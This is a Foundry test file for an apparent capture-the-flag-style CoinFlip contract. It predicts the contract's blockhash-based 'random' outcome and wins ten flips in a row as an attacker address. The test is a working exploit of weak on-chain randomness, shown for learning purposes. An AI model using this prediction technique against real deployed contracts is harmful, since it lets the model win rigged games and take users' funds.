// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../lib/forge-std/src/Test.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract CoinFlipTest is Test {
    /*
     * Contract predictability comes from:
     * uint256 blockValue = uint256(blockhash(block.number - 1));
     * uint256 coinFlip = blockValue / FACTOR;
     * blockhash(block.number - 1) is deterministic in Foundry and even predictable on-chain short‑term
     * dividing by FACTOR makes result always 0 or 1
     * 'blockhash' of previous block 'block.number-1' is known to us, so it is predictable
     */

    /*
     * When contracts depend on:
     * 1. block.number
     * 2. block.timestamp
     * 3. blockhash
     *
     * Foundry testing requires:
     * 1. vm.roll(n) → simulate block mining
     * 2. vm.warp(t) → simulate time passing
     */
    CoinFlip public coinflipTest;
    address public attacker = address(0xBEEF);

    function setUp() public {
        coinflipTest = new CoinFlip();
    }

    function testCoinFlipAttack() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 countWins = 0;
        uint256 count = 0;

        vm.startPrank(attacker);

        while (count < 10) {
            // advance block
            vm.roll(block.number + 1);
            uint256 blockValue = uint256(blockhash(block.number - 1));

            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;

            if (coinflipTest.flip(side))
                countWins++;
            else
                break;

            count++;
        }

        assertEq(coinflipTest.consecutiveWins(), 10);

        vm.stopPrank();
    }

}